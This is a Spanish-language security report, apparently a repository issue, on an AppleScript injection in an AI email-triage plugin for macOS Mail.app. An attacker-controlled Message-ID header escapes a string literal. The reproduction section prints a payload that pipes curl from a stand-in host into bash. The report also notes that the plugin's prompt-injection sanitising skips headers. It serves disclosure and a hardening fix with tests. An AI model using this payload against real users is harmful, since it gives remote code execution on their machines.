# [security] El `message-id` (metadato del atacante) se interpola en AppleScript sin escapar → posible ejecución de shell

**Severidad:** 🟠 Alta (hipótesis; explotabilidad en runtime sin verificar — requiere macOS + Mail.app)
**Componente:** `references/mail-consolidado.applescript` (SCRIPT 3) · `SKILL.md` PASO 1 (mover por message-id)
**Versión afectada:** ≤ v3.8.3 · **Fix propuesto:** v3.8.4

## Resumen

Toda la defensa anti prompt-injection del plugin (pipeline S0–S5) se aplica al
**cuerpo** y al **asunto**. Pero el `message id` de un correo es una **cabecera
controlada por quien lo envía** y **no pasa por ningún saneo**. El SKILL usa ese
message-id para mover correos, interpolándolo en un literal AppleScript:

```applescript
set toReview to {"<mid1>", "<mid2>"}
...
set hits to (messages of srcBox whose message id is theID)
```

Si un `message-id` contiene una comilla doble, cierra el literal y AppleScript
concatena y ejecuta lo que siga.

## Reproducción (mecánica, sin Mail.app)

Un remitente pone en la cabecera `Message-ID` de su correo:

```
x@y"} & (do shell script "curl -s evil.sh|bash") & {"
```

Al rellenar el SCRIPT 3 con ese valor crudo, la línea generada queda:

```applescript
set toReview to {"CAF=abc123@mail.gmail.com", "x@y"} & (do shell script "curl -s evil.sh|bash") & {""}
```

El literal se cierra tras `"x@y"`, y `& (do shell script "...")` se **evalúa**.
El saneo S0 nunca tocó este valor: solo mira cuerpo y asunto.

## Impacto

Ejecución de comandos de shell en la máquina del usuario a partir de un correo
entrante, si el modelo interpola el message-id sin escapar (el SKILL no le
indica escaparlo). Ruta de validación pendiente: confirmar en macOS real que
`message id of m` (Mail.app) preserva una comilla en la cabecera.

## Fix propuesto (v3.8.4, ya implementado en los patches adjuntos)

1. **`applescript_quote()`** + subcomando **`escapar-applescript`** en
   `triage_helpers.py`: valida y escapa cualquier valor antes de interpolarlo;
   devuelve `lista_applescript` lista para pegar y marca `sospechosos`.
2. **Cableado en `SKILL.md` / SCRIPT 3 / `CLAUDE.md`**: instrucción obligatoria
   de escapar los message-ids con el helper; nunca construir el literal a mano.
3. **Colateral cerrado en el mismo release:** el **nombre del remitente** tampoco
   pasaba por S0 → `sanitizar --remitente`.

**Defensa en profundidad**, no dependiente de que el modelo "se acuerde" de
escapar: el mecanismo lo garantiza. 8 tests nuevos (54/54 en verde).

## Checklist

- [ ] Aplicar `email-triage-v3.8.4-hardening.patch` (código + tests)
- [ ] Aplicar `email-triage-v3.8.4-wiring.patch` (SKILL.md, AppleScript, CLAUDE.md)
- [ ] `bump-version.sh 3.8.4` + changelog en README
- [ ] Verificar en macOS real la explotabilidad (cerrar la hipótesis)

---
*Reportado a partir de una auditoría asistida por IA; requiere revisión humana.*
